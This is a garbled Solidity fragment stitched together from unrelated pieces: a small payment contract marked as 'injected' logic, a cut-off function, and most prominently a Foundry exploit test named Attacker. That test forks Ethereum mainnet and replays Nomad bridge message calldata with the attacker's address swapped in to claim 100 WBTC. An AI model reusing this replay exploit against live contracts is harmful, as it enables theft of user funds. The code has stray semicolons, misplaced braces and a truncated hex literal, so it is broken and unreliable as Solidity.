
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IReplica constant Replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
contract Attacker is Test {
    function setUp() public {
        cheat.createSelectFork("mainnet", 15259100);
        cheat.label(address(Replica), "Replica");
        cheat.label(address(WBTC), "WBTC")};
    function testExploit() public {
        console.log("Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one.");
        console.log("We mock how attackers/whitehats replay the calldata at block 15259100\n");
        emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
        console.log("Attacker claim 100 WBTC from NomadBridge...");
        bytes memory msgP1 = hex"6265616d0000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d6006574680000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a300657468000000000000000000000000";
        bytes memory recvAddr = abi.encodePacked(address(this));
        bytes memory msgP2 = hex"0000000000000000000000000000000000000000000000
function setPrice(uint newPrice) public {
    price = newPrice}